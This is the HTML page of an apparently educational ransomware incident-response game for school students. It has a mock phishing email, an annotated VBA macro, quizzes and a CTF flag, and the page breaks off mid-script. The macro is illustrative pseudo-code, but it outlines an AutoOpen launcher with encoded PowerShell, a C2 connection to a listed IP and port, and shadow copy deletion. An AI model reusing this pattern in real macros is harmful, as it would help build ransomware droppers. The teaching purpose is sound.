---
layout: default
title: Game 03 — Ransomware Zero
---
<style>
/* ═══════════════════════════════════════════
   RANSOMWARE ZERO — Emergency Command Centre
   Palette: Deep black, emergency red, amber
   ═══════════════════════════════════════════ */

@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&display=swap');

:root {
  --bg:      #080808;
  --bg2:     #0e0e0e;
  --bg3:     #161616;
  --red:     #ff2244;
  --red-dim: rgba(255,34,68,0.15);
  --amber:   #ffaa00;
  --green:   #00ff88;
  --white:   #f0f0f0;
  --muted:   #666;
  --border:  rgba(255,34,68,0.25);
  --mono:    'Share Tech Mono', monospace;
  --display: 'Rajdhani', sans-serif;
}

* { box-sizing: border-box; margin: 0; padding: 0; }

body {
  font-family: var(--display);
  background: var(--bg);
  color: var(--white);
  min-height: 100vh;
}

/* Scanlines overlay */
body::after {
  content: '';
  position: fixed;
  inset: 0;
  background: repeating-linear-gradient(
    0deg, transparent, transparent 3px,
    rgba(255,34,68,0.015) 3px, rgba(255,34,68,0.015) 6px
  );
  pointer-events: none;
  z-index: 9997;
}

/* ─── Safety Ribbon ─── */
.safety-ribbon {
  background: #ff6b00;
  color: #000;
  text-align: center;
  padding: 10px 8px;
  font-size: 0.72em;
  font-weight: 700;
  letter-spacing: 3px;
  font-family: var(--mono);
  position: sticky;
  top: 0;
  z-index: 100;
  animation: ribbon-pulse 3s ease-in-out infinite;
}
@keyframes ribbon-pulse { 0%,100%{opacity:1} 50%{opacity:0.7} }

/* ─── Alert Banner ─── */
.alert-banner {
  background: var(--red);
  color: #000;
  font-family: var(--mono);
  font-size: 0.8em;
  font-weight: 700;
  letter-spacing: 2px;
  text-align: center;
  padding: 10px;
  animation: alert-flash 1s step-end infinite;
}
@keyframes alert-flash { 0%,100%{opacity:1} 50%{opacity:0.6} }

/* ─── Wrap ─── */
.game-wrap {
  max-width: 760px;
  margin: 0 auto;
  padding: 24px 16px 80px;
}

/* ─── Header ─── */
.game-header {
  text-align: center;
  margin-bottom: 28px;
  border: 1px solid var(--border);
  border-radius: 4px;
  padding: 20px;
  background: var(--bg2);
  position: relative;
  overflow: hidden;
}
.game-header::before {
  content: '';
  position: absolute;
  inset: 0;
  background: linear-gradient(135deg, rgba(255,34,68,0.06), transparent);
  pointer-events: none;
}
.game-tag {
  font-family: var(--mono);
  font-size: 0.7em;
  color: var(--red);
  letter-spacing: 3px;
  margin-bottom: 10px;
  display: block;
}
.game-header h1 {
  font-family: var(--display);
  font-size: clamp(2em, 8vw, 3.2em);
  font-weight: 700;
  color: var(--white);
  letter-spacing: 4px;
  text-transform: uppercase;
  text-shadow: 0 0 40px rgba(255,34,68,0.5);
  margin-bottom: 6px;
}
.game-header h1 span { color: var(--red); }
.game-header .tagline {
  font-family: var(--mono);
  font-size: 0.78em;
  color: var(--muted);
  margin-bottom: 16px;
}

/* ─── Countdown ─── */
.countdown-bar {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 12px;
  background: rgba(255,170,0,0.08);
  border: 1px solid rgba(255,170,0,0.3);
  border-radius: 4px;
  padding: 10px 16px;
  font-family: var(--mono);
}
.cd-label { font-size: 0.72em; color: var(--amber); letter-spacing: 2px; }
.cd-time  { font-size: 1.3em; color: var(--amber); font-weight: 700; }
.cd-track { flex: 1; height: 4px; background: rgba(255,170,0,0.15); border-radius: 2px; overflow: hidden; }
.cd-fill  { height: 100%; width: 100%; background: var(--amber); border-radius: 2px; transition: width 1s linear; }

/* ─── Stage Progress ─── */
.stage-nav {
  display: flex;
  gap: 4px;
  margin-bottom: 20px;
}
.sn-item {
  flex: 1;
  padding: 8px 4px;
  text-align: center;
  font-family: var(--mono);
  font-size: 0.62em;
  letter-spacing: 1px;
  color: var(--muted);
  border: 1px solid rgba(255,255,255,0.06);
  border-radius: 3px;
  transition: all 0.3s;
}
.sn-item.active { color: var(--red); border-color: rgba(255,34,68,0.4); background: rgba(255,34,68,0.07); }
.sn-item.done   { color: var(--green); border-color: rgba(0,255,136,0.3); }

/* ─── Stage / Phase ─── */
.stage { display: none; }
.stage.active { display: block; animation: stage-in 0.4s ease; }
.phase { display: none; }
.phase.active { display: block; animation: stage-in 0.3s ease; }
@keyframes stage-in {
  from { opacity: 0; transform: translateY(12px); }
  to   { opacity: 1; transform: translateY(0); }
}

/* ─── Story Block ─── */
.story-block {
  background: var(--bg2);
  border: 1px solid var(--border);
  border-left: 3px solid var(--red);
  border-radius: 4px;
  padding: 18px 20px;
  margin-bottom: 20px;
  font-family: var(--mono);
  font-size: 0.85em;
  line-height: 1.8;
  color: var(--white);
}
.story-block .who {
  font-size: 0.7em;
  letter-spacing: 2px;
  color: var(--red);
  margin-bottom: 8px;
}
.story-block strong { color: var(--amber); }

/* ─── Section Header ─── */
.section-head {
  font-family: var(--mono);
  font-size: 0.72em;
  letter-spacing: 3px;
  color: var(--red);
  text-transform: uppercase;
  margin-bottom: 12px;
  display: flex;
  align-items: center;
  gap: 8px;
}
.section-head::after {
  content: '';
  flex: 1;
  height: 1px;
  background: var(--border);
}

/* ─── Network Map ─── */
.network-map {
  background: var(--bg2);
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 16px;
  margin-bottom: 16px;
}
.net-label {
  font-family: var(--mono);
  font-size: 0.68em;
  color: var(--muted);
  letter-spacing: 2px;
  margin-bottom: 14px;
  display: flex;
  align-items: center;
  gap: 8px;
}
.net-label::before { content: '◉'; color: var(--red); animation: alert-flash 1.5s step-end infinite; }
.pc-grid {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 10px;
}
@media (max-width: 480px) {
  .pc-grid { grid-template-columns: repeat(2, 1fr); }
}
.pc-card {
  background: var(--bg3);
  border: 1px solid rgba(255,255,255,0.06);
  border-radius: 6px;
  padding: 12px 8px;
  text-align: center;
  cursor: pointer;
  transition: border-color 0.2s, transform 0.1s;
  min-height: 80px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 6px;
  -webkit-tap-highlight-color: transparent;
  position: relative;
}
.pc-card:active { transform: scale(0.96); }
@media (hover: hover) { .pc-card:hover { border-color: rgba(255,34,68,0.4); } }

.pc-card.infected {
  border-color: rgba(255,34,68,0.4);
  background: rgba(255,34,68,0.05);
  animation: infected-pulse 2s ease-in-out infinite;
}
@keyframes infected-pulse {
  0%,100%{ box-shadow: 0 0 0 0 rgba(255,34,68,0); }
  50%{ box-shadow: 0 0 12px 2px rgba(255,34,68,0.2); }
}
.pc-card.patient-zero {
  border-color: var(--amber);
  background: rgba(255,170,0,0.05);
  animation: pz-pulse 1.5s ease-in-out infinite;
}
@keyframes pz-pulse {
  0%,100%{ box-shadow: 0 0 0 0 rgba(255,170,0,0); }
  50%{ box-shadow: 0 0 14px 2px rgba(255,170,0,0.2); }
}
.pc-card.clean {
  border-color: rgba(0,255,136,0.2);
  background: rgba(0,255,136,0.03);
}
.pc-card.selected { outline: 2px solid var(--amber); outline-offset: 2px; }

.pc-icon { font-size: 1.8em; line-height: 1; }
.pc-name { font-family: var(--mono); font-size: 0.6em; color: var(--muted); letter-spacing: 1px; }
.pc-status { font-size: 0.7em; }

/* ─── Status Drawer ─── */
.status-drawer {
  display: none;
  position: fixed;
  bottom: 0; left: 0; right: 0;
  background: var(--bg2);
  border-top: 2px solid var(--red);
  border-radius: 16px 16px 0 0;
  padding: 20px 20px 32px;
  z-index: 500;
  max-height: 70vh;
  overflow-y: auto;
  animation: drawer-up 0.3s ease;
  -webkit-overflow-scrolling: touch;
}
@media (min-width: 600px) {
  .status-drawer {
    position: static;
    border-radius: 6px;
    border: 1px solid var(--border);
    border-left: 3px solid var(--amber);
    animation: stage-in 0.3s ease;
    max-height: none;
    margin-bottom: 16px;
  }
}
@keyframes drawer-up {
  from { transform: translateY(100%); }
  to   { transform: translateY(0); }
}
.drawer-handle {
  width: 36px; height: 4px;
  background: rgba(255,255,255,0.15);
  border-radius: 2px;
  margin: 0 auto 16px;
  display: block;
}
@media (min-width: 600px) { .drawer-handle { display: none; } }

.drawer-overlay {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.6);
  z-index: 499;
}
@media (min-width: 600px) { .drawer-overlay { display: none !important; } }

.drawer-machine-id {
  font-family: var(--mono);
  font-size: 0.7em;
  letter-spacing: 2px;
  color: var(--amber);
  margin-bottom: 12px;
}
.drawer-row {
  display: flex;
  gap: 10px;
  font-family: var(--mono);
  font-size: 0.8em;
  padding: 8px 0;
  border-bottom: 1px solid rgba(255,255,255,0.05);
  flex-wrap: wrap;
}
.drawer-row:last-of-type { border-bottom: none; }
.dr-key   { color: var(--muted); min-width: 110px; flex-shrink: 0; }
.dr-val   { color: var(--white); word-break: break-word; }
.dr-val.warn { color: var(--amber); }
.dr-val.crit { color: var(--red); font-weight: 700; }
.dr-val.ok   { color: var(--green); }

/* ─── Code Block ─── */
.code-block {
  background: #050505;
  border: 1px solid rgba(255,34,68,0.2);
  border-radius: 6px;
  overflow: hidden;
  margin: 16px 0;
  font-family: var(--mono);
  font-size: 0.82em;
}
.code-titlebar {
  background: var(--bg3);
  padding: 8px 14px;
  border-bottom: 1px solid rgba(255,34,68,0.15);
  font-size: 0.7em;
  color: var(--muted);
  letter-spacing: 1px;
  display: flex; align-items: center; gap: 8px;
}
.code-titlebar::before { content: '●'; color: var(--red); }
.code-line {
  display: flex;
  align-items: flex-start;
  padding: 8px 14px;
  border-bottom: 1px solid rgba(255,255,255,0.03);
  cursor: pointer;
  transition: background 0.15s;
  gap: 12px;
  -webkit-tap-highlight-color: transparent;
}
.code-line:last-child { border-bottom: none; }
@media (hover: hover) { .code-line:hover { background: rgba(255,34,68,0.04); } }
.code-line:active { background: rgba(255,34,68,0.07); }
.code-line.expanded { background: rgba(255,170,0,0.05); }
.cl-num  { color: rgba(255,255,255,0.2); min-width: 20px; flex-shrink: 0; font-size: 0.85em; }
.cl-code { flex: 1; }
.cl-code .kw  { color: #ff79c6; }
.cl-code .fn  { color: #50fa7b; }
.cl-code .str { color: #f1fa8c; }
.cl-code .cm  { color: var(--muted); font-style: italic; }
.cl-expand-icon { color: var(--amber); font-size: 0.8em; flex-shrink: 0; transition: transform 0.2s; }
.code-line.expanded .cl-expand-icon { transform: rotate(90deg); }
.cl-annotation {
  display: none;
  background: rgba(255,170,0,0.08);
  border-left: 2px solid var(--amber);
  padding: 10px 14px;
  font-size: 0.88em;
  color: var(--amber);
  line-height: 1.7;
  margin: 0 14px 0 46px;
}
.cl-annotation.visible { display: block; animation: stage-in 0.25s ease; }

/* ─── Email Mock ─── */
.email-mock {
  background: #f8f8f8;
  border-radius: 8px;
  overflow: hidden;
  margin-bottom: 16px;
  color: #111;
}
.em-header {
  background: #e0e0e0;
  padding: 12px 16px;
  font-family: Arial, sans-serif;
  font-size: 0.82em;
  border-bottom: 1px solid #ccc;
}
.em-field { display: flex; gap: 8px; margin-bottom: 4px; }
.em-label { color: #666; min-width: 50px; font-weight: 700; }
.em-val   { color: #222; }
.em-val .warn { color: #cc0000; font-weight: 700; }
.em-body {
  padding: 16px;
  font-family: Arial, sans-serif;
  font-size: 0.85em;
  line-height: 1.7;
}
.em-attach {
  background: #e8e8e8;
  border-radius: 4px;
  padding: 8px 12px;
  display: inline-flex;
  align-items: center;
  gap: 8px;
  font-size: 0.82em;
  margin-top: 12px;
}
.em-attach-icon { font-size: 1.2em; }
.em-attach-name { color: #0066cc; text-decoration: underline; }

/* ─── Word Macro Dialog ─── */
.word-dialog {
  background: #fff;
  border: 2px solid #0078d4;
  border-radius: 4px;
  overflow: hidden;
  margin-bottom: 16px;
  color: #111;
}
.wd-titlebar {
  background: #0078d4;
  color: #fff;
  padding: 6px 12px;
  font-size: 0.82em;
  display: flex;
  align-items: center;
  gap: 8px;
}
.wd-body { padding: 16px; font-family: Arial, sans-serif; font-size: 0.82em; line-height: 1.6; }
.wd-warning { color: #cc0000; font-weight: 700; margin-bottom: 8px; display: flex; gap: 8px; }
.wd-btns { display: flex; gap: 8px; margin-top: 14px; flex-wrap: wrap; }
.wd-btn {
  padding: 8px 16px; border-radius: 3px; font-size: 0.85em; border: 1px solid #ccc;
  background: #f0f0f0; cursor: not-allowed; min-height: 36px;
}
.wd-btn.danger { background: #cc0000; color: #fff; border-color: #aa0000; }

/* ─── Quiz Questions ─── */
.quiz-block {
  background: var(--bg2);
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 18px 20px;
  margin-bottom: 12px;
}
.quiz-q {
  font-family: var(--mono);
  font-size: 0.85em;
  color: var(--amber);
  margin-bottom: 12px;
  line-height: 1.6;
}
.quiz-opts {
  display: flex;
  flex-direction: column;
  gap: 8px;
}
.quiz-opt {
  background: var(--bg3);
  border: 1px solid rgba(255,255,255,0.08);
  border-radius: 4px;
  padding: 12px 16px;
  cursor: pointer;
  font-family: var(--mono);
  font-size: 0.8em;
  line-height: 1.5;
  transition: border-color 0.2s, background 0.2s;
  min-height: 48px;
  -webkit-tap-highlight-color: transparent;
}
@media (hover: hover) { .quiz-opt:hover { border-color: rgba(255,170,0,0.4); background: rgba(255,170,0,0.04); } }
.quiz-opt:active { transform: scale(0.98); }
.quiz-opt.correct { border-color: var(--green); background: rgba(0,255,136,0.07); color: var(--green); }
.quiz-opt.wrong   { border-color: var(--red);   background: rgba(255,34,68,0.07);  color: var(--red); animation: shake 0.4s ease; }
@keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-6px)} 40%{transform:translateX(6px)} 60%{transform:translateX(-4px)} 80%{transform:translateX(4px)} }
.quiz-result {
  display: none;
  font-family: var(--mono);
  font-size: 0.78em;
  margin-top: 10px;
  padding: 8px 12px;
  border-radius: 4px;
  line-height: 1.6;
}
.quiz-result.correct { background: rgba(0,255,136,0.08); color: var(--green); }
.quiz-result.wrong   { background: rgba(255,34,68,0.08); color: var(--red); }

/* ─── Decision Cards ─── */
.decision-arena {
  margin-bottom: 16px;
}
.decision-card {
  display: none;
  background: var(--bg2);
  border: 1px solid rgba(255,170,0,0.25);
  border-radius: 8px;
  overflow: hidden;
}
.decision-card.active { display: block; animation: stage-in 0.35s ease; }
.dc-progress {
  font-family: var(--mono);
  font-size: 0.68em;
  color: var(--muted);
  letter-spacing: 2px;
  padding: 10px 16px;
  background: rgba(255,170,0,0.04);
  border-bottom: 1px solid rgba(255,170,0,0.1);
  display: flex;
  justify-content: space-between;
}
.dc-progress .num { color: var(--amber); }
.dc-situation {
  padding: 16px 20px;
  font-family: var(--mono);
  font-size: 0.85em;
  line-height: 1.7;
  border-bottom: 1px solid rgba(255,255,255,0.04);
}
.dc-situation .highlight { color: var(--amber); font-weight: 700; }
.dc-choices {
  padding: 14px 16px;
  display: flex;
  flex-direction: column;
  gap: 8px;
}
.dc-choice {
  background: var(--bg3);
  border: 1px solid rgba(255,255,255,0.08);
  border-radius: 5px;
  padding: 14px 16px;
  cursor: pointer;
  font-family: var(--mono);
  font-size: 0.82em;
  line-height: 1.5;
  transition: border-color 0.2s, background 0.2s;
  min-height: 56px;
  display: flex;
  align-items: center;
  gap: 10px;
  -webkit-tap-highlight-color: transparent;
}
.dc-choice:active { transform: scale(0.99); }
@media (hover: hover) { .dc-choice:hover { border-color: rgba(255,170,0,0.3); background: rgba(255,170,0,0.03); } }
.dc-choice.correct { border-color: var(--green); background: rgba(0,255,136,0.06); }
.dc-choice.wrong   { border-color: var(--red);   background: rgba(255,34,68,0.06); animation: shake 0.4s ease; }

.dc-consequence {
  display: none;
  padding: 14px 20px;
  border-top: 1px solid rgba(255,255,255,0.05);
  font-family: var(--mono);
  font-size: 0.82em;
  line-height: 1.7;
}
.dc-consequence.correct { color: var(--green); background: rgba(0,255,136,0.04); }
.dc-consequence.wrong   { color: var(--red);   background: rgba(255,34,68,0.04); }
.dc-consequence .lesson { color: var(--amber); margin-top: 6px; display: block; }

/* ─── Buttons ─── */
.btn {
  background: transparent;
  border: 1px solid var(--red);
  color: var(--red);
  padding: 14px 20px;
  font-family: var(--mono);
  font-size: 0.82em;
  letter-spacing: 2px;
  cursor: pointer;
  border-radius: 3px;
  transition: background 0.2s, box-shadow 0.2s;
  min-height: 48px;
  width: 100%;
  display: block;
  text-align: center;
  margin-top: 10px;
  text-transform: uppercase;
  -webkit-tap-highlight-color: transparent;
}
@media (hover: hover) {
  .btn:hover { background: rgba(255,34,68,0.12); box-shadow: 0 0 14px rgba(255,34,68,0.2); }
}
.btn:active { transform: scale(0.98); }
.btn.amber { border-color: var(--amber); color: var(--amber); }
@media (hover: hover) { .btn.amber:hover { background: rgba(255,170,0,0.1); box-shadow: 0 0 14px rgba(255,170,0,0.2); } }
.btn.green { border-color: var(--green); color: var(--green); }
@media (hover: hover) { .btn.green:hover { background: rgba(0,255,136,0.08); } }
.btn.disabled { opacity: 0.35; pointer-events: none; }

/* ─── Flag Card ─── */
.flag-card {
  display: none;
  border: 2px solid var(--red);
  border-radius: 8px;
  padding: 28px 20px;
  text-align: center;
  background: rgba(255,34,68,0.04);
  box-shadow: 0 0 40px rgba(255,34,68,0.12);
  animation: flag-in 0.6s ease;
}
@keyframes flag-in {
  from { opacity: 0; transform: scale(0.9); }
  to   { opacity: 1; transform: scale(1); }
}
.flag-card h2 {
  font-family: var(--display);
  font-size: 1.2em;
  letter-spacing: 4px;
  color: var(--red);
  text-shadow: 0 0 20px rgba(255,34,68,0.5);
  margin-bottom: 6px;
}
.flag-subtitle { font-family: var(--mono); font-size: 0.75em; color: var(--muted); margin-bottom: 20px; }
.flag-value {
  background: var(--bg);
  border: 1px dashed rgba(255,34,68,0.5);
  color: var(--amber);
  padding: 14px;
  border-radius: 3px;
  font-family: var(--mono);
  font-size: clamp(0.72em, 3vw, 0.88em);
  letter-spacing: 1px;
  word-break: break-all;
  margin-bottom: 16px;
}
.flag-badge {
  display: inline-block;
  border: 1px solid rgba(0,255,136,0.4);
  color: var(--green);
  padding: 5px 14px;
  border-radius: 20px;
  font-family: var(--mono);
  font-size: 0.72em;
  letter-spacing: 2px;
  margin-bottom: 20px;
}
.debrief-box {
  background: var(--bg2);
  border: 1px solid rgba(255,255,255,0.06);
  border-radius: 6px;
  padding: 16px 20px;
  text-align: left;
  margin-top: 8px;
}
.db-title { font-family: var(--mono); font-size: 0.7em; color: var(--amber); letter-spacing: 2px; margin-bottom: 10px; }
.db-item {
  font-family: var(--mono);
  font-size: 0.8em;
  color: var(--white);
  margin-bottom: 6px;
  padding-left: 4px;
  line-height: 1.6;
}
.db-item::before { content: '→ '; color: var(--green); }

/* Canvas confetti */
#confetti-canvas { position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:9999; display:none; }
</style>

<canvas id="confetti-canvas"></canvas>
<div class="safety-ribbon">// TRAINING EXERCISE — EDUCATIONAL PURPOSES ONLY //</div>
<div class="alert-banner">⚠ RANSOMWARE INCIDENT SIMULATION — CREST SECONDARY SCHOOL ⚠</div>

<div class="game-wrap">

  <!-- ═══ HEADER ═══ -->
  <div class="game-header">
    <span class="game-tag">GAME 03 — INCIDENT RESPONSE</span>
    <h1>RANSOMWARE <span>ZERO</span></h1>
    <p class="tagline">7:15AM · CREST SECONDARY SCHOOL · LIBRARY COMPUTER LAB</p>
    <div class="countdown-bar">
      <span class="cd-label">PRINCIPAL ARRIVES IN</span>
      <div class="cd-track"><div class="cd-fill" id="cd-fill"></div></div>
      <span class="cd-time" id="cd-time">15:00</span>
    </div>
  </div>

  <div class="stage-nav">
    <div class="sn-item active" id="sn1">01 · TRIAGE</div>
    <div class="sn-item" id="sn2">02 · ANALYSE</div>
    <div class="sn-item" id="sn3">03 · RESPOND</div>
  </div>

  <!-- ══════════════════════════════════
       STAGE 1 — NETWORK TRIAGE
  ══════════════════════════════════ -->
  <div id="stage1" class="stage active">

    <div class="story-block">
      <div class="who">// RYO (PLAYER) — 07:15 AM</div>
      You came early to print your N-Level notes. The library is dark. Every screen glows with the same message:<br><br>
      <strong>"YOUR FILES HAVE BEEN ENCRYPTED. PAY $5,000 BTC. CONTACT ADMIN_SG@PROTON.ME"</strong><br><br>
      Mr Razif is frozen. Nobody else is here. Principal Tan arrives in 15 minutes.<br>
      <strong>Find which computer started the infection. That's your first move.</strong>
    </div>

    <div class="section-head">Network Map — Library Lab</div>

    <div class="network-map">
      <div class="net-label">CREST-SEC · LIBRARY · 8 NODES DETECTED</div>
      <div class="pc-grid" id="pc-grid">
        <!-- Populated by JS -->
      </div>
    </div>

    <div id="drawer-overlay" class="drawer-overlay" onclick="closeDrawer()"></div>
    <div id="status-drawer" class="status-drawer">
      <span class="drawer-handle" onclick="closeDrawer()"></span>
      <div id="drawer-content"></div>
      <button class="btn amber disabled" id="flag-pz-btn" onclick="flagPatientZero()">⚑ FLAG AS PATIENT ZERO</button>
    </div>

    <button class="btn disabled" id="s1-next" onclick="goStage(2)">▶ PROCEED TO MACRO ANALYSIS →</button>
  </div>


  <!-- ══════════════════════════════════
       STAGE 2 — MACRO ANALYSIS
  ══════════════════════════════════ -->
  <div id="stage2" class="stage">

    <div class="story-block">
      <div class="who">// KAI — STAGE 2: UNDERSTAND THE ATTACK</div>
      Mr Razif opened an email this morning. The attachment looked like an invoice. You need to understand exactly what that file did — so you can explain it to CSA when you call them.
    </div>

    <!-- Phase 2A: Email -->
    <div id="s2-email" class="phase active">
      <div class="section-head">The Phishing Email</div>
      <div class="email-mock">
        <div class="em-header">
          <div class="em-field"><span class="em-label">FROM:</span><span class="em-val"><span class="warn">st-supplies-billing@gmail.com</span> ← Gmail, not a business domain</span></div>
          <div class="em-field"><span class="em-label">TO:</span><span class="em-val">mrazif@crestsec.edu.sg</span></div>
          <div class="em-field"><span class="em-label">SUBJ:</span><span class="em-val">Urgent: March 2026 Invoice — ST Supplies Pte Ltd</span></div>
        </div>
        <div class="em-body">
          Dear Mr Razif,<br><br>
          Please find attached the invoice for March 2026 school supply delivery. Kindly review and approve by 5pm today as we need to process payment before end of month.<br><br>
          If you have any questions, please reply to this email.<br><br>
          Regards,<br>
          Billy Tan<br>
          Accounts — ST Supplies Pte Ltd<br><br>
          <div class="em-attach">
            <span class="em-attach-icon">📄</span>
            <span class="em-attach-name">Invoice_March2026.docm</span>
            <span style="color:#666; font-size:0.9em;">(242 KB)</span>
          </div>
        </div>
      </div>

      <div class="word-dialog">
        <div class="wd-titlebar">⚠ Microsoft Word — Security Warning</div>
        <div class="wd-body">
          <div class="wd-warning">⚠ MACROS HAVE BEEN DISABLED</div>
          <p>This file contains macros. Macros can contain viruses. For your protection, macros have been disabled. If you trust this document, click Enable Content to run the macros.</p>
          <div class="wd-btns">
            <div class="wd-btn">✕ Don't Enable</div>
            <div class="wd-btn danger">Enable Content ← Mr Razif clicked here</div>
          </div>
        </div>
      </div>
      <button class="btn amber" onclick="showMacroCode()">▶ OPEN THE MACRO CODE →</button>
    </div>

    <!-- Phase 2B: Code -->
    <div id="s2-code" class="phase">
      <div class="section-head">Macro Code — Invoice_March2026.docm</div>
      <p style="font-family:var(--mono); font-size:0.8em; color:var(--muted); margin-bottom:12px;">Tap each line to reveal what it does. You need to understand all 4 key lines.</p>

      <div class="code-block">
        <div class="code-titlebar">VBA MACRO — AutoOpen() procedure</div>

        <div class="code-line" id="cl0" onclick="toggleCodeLine(0)">
          <span class="cl-num">1</span>
          <div class="cl-code"><span class="kw">Sub</span> <span class="fn">AutoOpen</span>()</div>
          <span class="cl-expand-icon">▶</span>
        </div>
        <div class="cl-annotation" id="ca0">
          AutoOpen() is a special procedure that runs <em>automatically</em> the moment the document is opened — before the user does anything. This is why enabling macros is so dangerous.
        </div>

        <div class="code-line annotatable" id="cl1" onclick="toggleCodeLine(1)">
          <span class="cl-num">2</span>
          <div class="cl-code"><span class="fn">Shell</span> <span class="str">"cmd /c powershell -enc SGVsbG8="</span></div>
          <span class="cl-expand-icon">▶</span>
        </div>
        <div class="cl-annotation" id="ca1">
          This launches a hidden PowerShell command. The <code>-enc</code> flag takes Base64-encoded instructions — making it hard to read. PowerShell is a legitimate Windows tool, which is why antivirus often misses this.
        </div>

        <div class="code-line annotatable" id="cl2" onclick="toggleCodeLine(2)">
          <span class="cl-num">3</span>
          <div class="cl-code"><span class="fn">ConnectTo</span>(<span class="str">"185.220.101.47"</span>, port=<span class="str">4444</span>)</div>
          <span class="cl-expand-icon">▶</span>
        </div>
        <div class="cl-annotation" id="ca2">
          The malware phones home to the attacker's Command & Control (C2) server. IP 185.220.101.47 appeared in our earlier Case 02 investigation — same threat actor. The attacker now controls this machine remotely.
        </div>

        <div class="code-line annotatable" id="cl3" onclick="toggleCodeLine(3)">
          <span class="cl-num">4</span>
          <div class="cl-code"><span class="fn">DeleteShadowCopies</span>()</div>
          <span class="cl-expand-icon">▶</span>
        </div>
        <div class="cl-annotation" id="ca3">
          Windows automatically saves backup snapshots (Shadow Copies) of files. Ransomware always deletes these first — so the victim can't restore files for free. This is why offline backups on a disconnected drive are essential.
        </div>

        <div class="code-line" id="cl4" onclick="toggleCodeLine(4)">
          <span class="cl-num">5</span>
          <div class="cl-code"><span class="fn">EncryptFiles</span>(<span class="str">"C:\Users\*"</span>, key=<span class="str">"gh0st_key_2026"</span>)</div>
          <span class="cl-expand-icon">▶</span>
        </div>
        <div class="cl-annotation" id="ca4">
          Every file on every user's drive is encrypted with the attacker's key. Without it, files are unreadable. The attacker keeps the key on their C2 server and only "sells" it if you pay the ransom.
        </div>

        <div class="code-line" id="cl5">
          <span class="cl-num">6</span>
          <div class="cl-code"><span class="fn">DropRansomnote</span>(<span class="str">"READ_THIS.txt"</span>)</div>
        </div>
      </div>

      <div id="annotation-progress" style="font-family:var(--mono); font-size:0.75em; color:var(--muted); margin-bottom:12px; text-align:center;">
        Opened: <span id="annotation-count">0</span> / 4 key annotations
      </div>

      <button class="btn amber disabled" id="quiz-btn" onclick="showQuiz()">▶ ANSWER 3 QUICK QUESTIONS →</button>
    </div>

    <!-- Phase 2C: Quiz -->
    <div id="s2-quiz" class="phase">
      <div class="section-head">Quick Check — Confirm Your Understanding</div>

      <div class="quiz-block">
        <div class="quiz-q">Q1: What does AutoOpen() mean in this macro?</div>
        <div class="quiz-opts">
          <div class="quiz-opt" data-q="1" data-correct="false" onclick="answerQuiz(this,1,false)">It shows a popup asking the user to click "Open"</div>
          <div class="quiz-opt" data-q="1" data-correct="true"  onclick="answerQuiz(this,1,true)">It runs automatically when the document opens, without user action</div>
          <div class="quiz-opt" data-q="1" data-correct="false" onclick="answerQuiz(this,1,false)">It auto-saves the document to OneDrive</div>
        </div>
        <div class="quiz-result" id="qr1"></div>
      </div>

      <div class="quiz-block">
        <div class="quiz-q">Q2: What is the IP address 185.220.101.47 in this context?</div>
        <div class="quiz-opts">
          <div class="quiz-opt" data-q="2" data-correct="false" onclick="answerQuiz(this,2,false)">The school's own server</div>
          <div class="quiz-opt" data-q="2" data-correct="false" onclick="answerQuiz(this,2,false)">Microsoft's update server</div>
          <div class="quiz-opt" data-q="2" data-correct="true"  onclick="answerQuiz(this,2,true)">The attacker's Command & Control (C2) server — the machine receives instructions from here</div>
        </div>
        <div class="quiz-result" id="qr2"></div>
      </div>

      <div class="quiz-block">
        <div class="quiz-q">Q3: Why does ransomware delete shadow copies first?</div>
        <div class="quiz-opts">
          <div class="quiz-opt" data-q="3" data-correct="false" onclick="answerQuiz(this,3,false)">To free up disk space for the encrypted files</div>
          <div class="quiz-opt" data-q="3" data-correct="true"  onclick="answerQuiz(this,3,true)">To prevent victims from restoring files from Windows backups for free — forcing them to pay</div>
          <div class="quiz-opt" data-q="3" data-correct="false" onclick="answerQuiz(this,3,false)">To hide the ransomware from antivirus scans</div>
        </div>
        <div class="quiz-result" id="qr3"></div>
      </div>

      <button class="btn disabled" id="s2-next" onclick="goStage(3)">▶ PROCEED TO INCIDENT RESPONSE →</button>
    </div>

  </div><!-- /stage2 -->


  <!-- ══════════════════════════════════
       STAGE 3 — INCIDENT RESPONSE
  ══════════════════════════════════ -->
  <div id="stage3" class="stage">

    <div class="story-block">
      <div class="who">// KAI — STAGE 3: MAKE THE RIGHT CALLS</div>
      You understand the attack. Now you need to respond. <strong>Every decision matters.</strong><br>
      Mr Razif is looking at you. Principal Tan is 5 minutes away. Choose carefully.
    </div>

    <div class="section-head">Decision Centre — 5 Calls to Make</div>

    <div class="decision-arena" id="decision-arena">
      <!-- Populated by JS -->
    </div>

    <div class="flag-card" id="flag-card">
      <h2>// INCIDENT CONTAINED</h2>
      <p class="flag-subtitle">You made the right calls. CSA has been notified. The backup is clean. Principal Tan arrives — and you have a full report ready.</p>
      <div class="flag-value">FLAG{r4ns0mwar3_z3r0_1nc1d3nt_r3sp0nd3r}</div>
      <div class="flag-badge">CERTIFIED: INCIDENT RESPONDER — CREST SEC</div>
      <div class="debrief-box">
        <div class="db-title">// KEY LESSONS</div>
        <div class="db-item">Macros + "Enable Content" = most common ransomware entry vector</div>
        <div class="db-item">Never pay the ransom — it funds more attacks and may not restore files</div>
        <div class="db-item">Isolate infected machines immediately — stop the spread first</div>
        <div class="db-item">Offline backups (unplugged drives) survive ransomware</div>
        <div class="db-item">Report to CSA + PDPC within 3 days if personal data was affected</div>
        <div class="db-item">Secondary scams are common — the attacker may contact you offering "help"</div>
      </div>
      <a href="/game4-social-engineer" style="display:block; margin-top:16px;">
        <button class="btn green" style="width:100%;">▶ PLAY GAME 4: SOCIAL ENGINEER →</button>
      </a>
    </div>

  </div><!-- /stage3 -->

</div><!-- /game-wrap -->

<script>
// ══════════════════════════════════
//  STATE
// ══════════════════════════════════
const gs = {
  stage: 1,
  pzSelected: null,
  pzFound: false,
  annotationsOpened: new Set(),
  quizAnswers: { 1: null, 2: null, 3: null },
  allQuizDone: false,
  decisionIdx: 0,
  decisionsCorrect: 0,
  allDecisionsDone: false,
